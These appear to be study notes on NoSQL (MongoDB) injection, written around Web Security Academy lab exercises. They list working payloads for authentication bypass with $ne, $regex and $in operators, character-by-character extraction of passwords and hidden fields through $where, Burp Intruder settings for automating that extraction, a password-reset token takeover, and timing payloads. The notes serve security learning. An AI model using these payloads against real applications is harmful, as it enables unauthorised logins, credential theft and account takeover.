# NoSQL Injection

<br>

## Summary 


<!-- MarkdownTOC -->

- [NoSQL syntax injection \(example payloads\)](#nosql-syntax-injection-example-payloads)
	- [Lab: Detecting NoSQL injection](#lab-detecting-nosql-injection)
- [NoSQL operator injection](#nosql-operator-injection)
	- [Lab: Exploiting NoSQL operator injection to bypass authentication](#lab-exploiting-nosql-operator-injection-to-bypass-authentication)
- [Exploiting syntax injection to extract data](#exploiting-syntax-injection-to-extract-data)
	- [Lab: Exploiting NoSQL injection to extract data](#lab-exploiting-nosql-injection-to-extract-data)
- [Exploiting NoSQL operator injection to extract data](#exploiting-nosql-operator-injection-to-extract-data)
	- [Lab: Exploiting NoSQL operator injection to extract unknown fields](#lab-exploiting-nosql-operator-injection-to-extract-unknown-fields)
- [Timing based injection](#timing-based-injection)

<!-- /MarkdownTOC -->



<br><br>

### NoSQL syntax injection (example payloads)

The following String (MongoDB) can be used to fuzz the application's parameters for NoSQL Injection vulnerabilities:

```
'"`{
;$Foo}
$Foo \xYZ
```
<br>


* For example inject the payload in a URL (Note - the payload needs to be URL encoded)

```
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

* If this causes a change from the original response, this may indicate that user input isn't filtered or sanitized correctly.


<br>

```
Note

NoSQL injection vulnerabilities can occur in a variety of contexts, and you need to adapt your fuzz strings accordingly. Otherwise, you may simply trigger validation errors that mean the application never executes your query.

In this example, we're injecting the fuzz string via the URL, so the string is URL-encoded. In some applications, you may need to inject your payload via a JSON property instead. In this case, this payload would become '\"`{\r;$Foo}\n$Foo \\xYZ\u0000.
```

<br>

* Submit the following payloads (single quote) to determine if the application uses our input as query syntax:

* If the first payload causes an error, and the second payload doesn't, the application may be vulnerable.

```
this.category == '''
```

```
this.category == '\''
```

<br>

* Conditional Payloads:

* False:

```
' && 0 && 'x
```

* True:

```
' && 1 && 'x
```

<br>

* OR TRUE/FALSE payloads:

```
'||'1'=='1
```

```
'||'1'=='2
```


<br><br>

#### Lab: Detecting NoSQL injection

* Perform a NoSQL injection attack that causes the application to display unreleased products. 

	* https://0a1300c403c5bd3a82fa2e6500c2009d.web-security-academy.net/filter?category=Accessories

* The following payload will cause the application to return everything from the database, as the injected payload is a condition that will always evaluates to TRUE:

```
category=Accessories'||'1'=='1
```

* On contrast, the following payload evaluates to FALSE:

```
category=Accessories'||'1'=='2
```

<br><br>

### NoSQL operator injection

*  NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result. Examples of MongoDB query operators include:

	* $where - Matches documents that satisfy a JavaScript expression.
    
    * $ne - Matches all values that are not equal to a specified value.
    
    * $in - Matches all of the values specified in an array.
    
    * $regex - Selects documents where values match a specified regular expression.


<br>

* How to submit query operators?

* JSON Messages:

```
{"username":"wiener"}

{"username":{"$ne":"invalid"}}
```

* URL-based Inputs: 
(If the below does not work then do the necessary and convert the request to a POST for application/json context payload.)

```
username=wiener

username[$ne]=invalid
```

<br>

* If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload: 

```
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

```
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```


<br><br>

#### Lab: Exploiting NoSQL operator injection to bypass authentication

* Goal:  Log into the application as the administrator user.

* The following payload will match a username that begins with the word "admin" and where the password field does not equal to "invalid", this will log us into the application as the admin user.

* The username name for the admin user was "admin4ygjye2f" which is why regex was needed to solve the challenge.

```
{
	"username":{
		"$regex":"admin.*"
	},
	"password":{
		"$ne":"invalid"
	}
}
```


<br><br>

### Exploiting syntax injection to extract data 

* In many NoSQL databases, some query operators or functions can run limited JavaScript code, such as MongoDB's $where operator and mapReduce() function. This means that, if a vulnerable application uses these operators or functions, the database may evaluate the JavaScript as part of the query. You may therefore be able to use JavaScript functions to extract data from the database. 

* Take the following query, where we can control the input value of 'admin'

```
{"$where":"this.username == 'admin'"}
```


* The following payloads may allow you to extract the admin's password one character at a time and confirm whether the password contains digits:

```
admin' && this.password[0] == 'a' || 'a'=='b
```

```
admin' && this.password.match(/\d/) || 'a'=='b
```

<br>

* Identify field names:

* Check if password field exists:

```
username=admin'+%26%26+this.password!%3d'
```

* Decoded payload:

```
username=admin' && this.password!='
```

* If you know that a certain field exists we can use test cases to identify how application responds to valid/invalid requests:

```
admin' && this.username!='
```

```
admin' && this.foo!='
```

<br><br>

#### Lab: Exploiting NoSQL injection to extract data

* Extract the password for the administrator user, then log in to their account. 

* We are given credentials to log into the application - wiener:peter

* The following endpoint is vulnerable to NoSQL Injection:

	* https://0a06006303e0b0d18172f72800dc0065.web-security-academy.net/user/lookup?user=wiener

* The following payloads where used to identify the vulnerability:

```
user=wiener'%26%26+0+%26%26+'x
```

```
user=wiener'%26%26+1+%26%26+'x
```

```
user=wiener'&& 1 && 'x
```


<br>

* The following payload returned the first user details in the database collection which was for the username "administrator".  This confirms that there is a user with that name.

```
user=wiener'||'1'%3d%3d'1
```

<br>

* The following payload will allow us to extract the administrator's password one character at time:

```
user=administrator'+%26%26+this.password[0]+%3d%3d+'a'+||+'a
```

Steps for Burp Intruder:

* Attack type:  Cluster bomb

* Send request with payload to intruder

* Set 2 payload positions

```
user=administrator'+%26%26+this.password[<position 1>]+%3d%3d+'<position 2>'+||+'a
```

* The configuration for the first payload set will be:

	* Payload type: Numbers
	* Type: Sequential
	* From: 0
	* To: 19

* The configuration for the second payload set will be:
	* Payload type: Simple list
	* Include all lowercase/uppercase letters and digits

* Filter by the length of the responses, the password will be 8 characters long.


<br><br>


### Exploiting NoSQL operator injection to extract data

* Even if the original query doesn't use any operators that enable you to run arbitrary JavaScript, you may be able to inject one of these operators yourself. You can then use boolean conditions to determine whether the application executes any JavaScript that you inject via this operator. 

<br>

Injecting operators in MongoDB

* To test whether you can inject operators, you could try adding the $where operator as an additional parameter, then send one request where the condition evaluates to false, and another that evaluates to true. For example: 

```
{"username":"wiener","password":"peter", "$where":"0"}
```

```
{"username":"wiener","password":"peter", "$where":"1"}
```

<br>

Extracting field names

* If you have injected an operator that enables you to run JavaScript, you may be able to use the keys() method to extract the name of data fields. For example, you could submit the following payload:

```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```


<br>

* Alternatively, you may be able to extract data using operators that don't enable you to run JavaScript. For example, you may be able to use the $regex operator to extract data character by character.

* Extract password field one character at a time

* For example, the following payload checks whether the password begins with an a:

```
{"username":"admin","password":{"$regex":"^a*"}}
```

<br><br>

#### Lab: Exploiting NoSQL operator injection to extract unknown fields


Goal:  Log into the application as carlos


* The following request contains a NoSQL injection vulnerability:

```
POST /login HTTP/2
Content-Type: application/json

 {
 	"username":"test",
 	"password":"test"
 }
```


* Inject different payloads into the application request to see how the responses change:


* Application response - Account locked: please reset your password

```json
{
  "username": "carlos",
  "password": {
    "$ne": "invalid"
  }
}
```

* Application response - Invalid username or password

```json
{
  "username": "carlos",
  "password": {
    "$ne": "invalid"
  },
  "$where": "0"
}
```

Application response - Account locked: please reset your password 


```json
{
  "username": "carlos",
  "password": {
    "$ne": "invalid"
  },
  "$where": "1"
}
```

* We now have a way to determine whether the results of a query are TRUE or FALSE

	* FALSE - Invalid username or password

	* TRUE - Account locked: please reset your password


<br>


* Use the following payload to extract the names of the Keys in the NoSQL collection:

* The part "(this)[1]" targets the first Key that is listed in the targeted Object.

```json
{
  "username": "carlos",
  "password": {
    "$ne": "invalid"
  },
  "$where": "Object.keys(this)[1].match('^.{0}u.*')"
}
```

Send the above request with payload to Burp Intruder:

* Attack type:  Cluster bomb

* Set 2 payload positions like below

```json
{
  "username": "carlos",
  "password": {
    "$ne": "invalid"
  },
  "$where": "Object.keys(this)[1].match('^.{<position 1>}<position 2>.*')"
}
```

* First payload position configuration (if the password is longer than 16 characters then this will need to be adjusted)

	* Payload type:  Numbers
	* From:  0
	* To:  15

* Second payload position configuration

	* Payload type:  Simple list
	* Include lowercase/uppercase letters and numbers in payload list

* Start the attack and filter by the responses that contain the TRUE value message

* The first Key identified was called "username".  Perform the same steps for the second, third, Keys:

```json
"$where": "Object.keys(this)[<INCREMENT THIS VALUE>].match('^.{<position 1>}<position 2>.*')"
```

<br>

* The fourth Key ended up containing the key for a password reset function:

```json
"$where": "Object.keys(this)[4].match('^.{<position 1>}<position 2>.*')"
```

* Now request the following endpoint, and the application responds with "Invalid Token" message:

```
GET /forgot-password?forgotPwd=
```

* Submitting any other random parameter name, will not have any affect on the application response, so we know that the parameter name "forgotPwd" is a valid one.

```
GET /forgot-password?randommmm=
```

* Now we need to extract the value of the "forgotPwd" Key one character at a time, use the following payload:

```json
{
  "username": "carlos",
  "password": {
    "$ne": "invalid"
  },
  "$where": "this.forgotPwd.match('^.{0}a.*')"
}
```

* Send the payload to Burp Intruder and use the similar configuration as before to extract the complete password.

* Cluster bomb

* Position 1 - numbers

* Position 2 - simple list

```
"$where":"this.forgotPwd.match('^.{<position 1>}<position 2>.*')"}
```


* Then send the password reset token value in the "forgotPwd" parameter and reset the password for carlos:

```
GET /forgot-password?forgotPwd=TOKEN_VALUE
```


<br><br>

### Timing based injection

*  To conduct timing-based NoSQL injection:

    * Load the page several times to determine a baseline loading time.
    
    * Insert a timing based payload into the input. A timing based payload causes an intentional delay in the response when executed. For example, the below payload causes an intentional delay of 5000 ms on successful injection.


```json
{"$where": "sleep(5000)"}
```

* Identify whether the response loads more slowly. This indicates a successful injection.


<br>


*  The following timing based payloads will trigger a time delay if the password beings with the letter a:

```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```


```
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

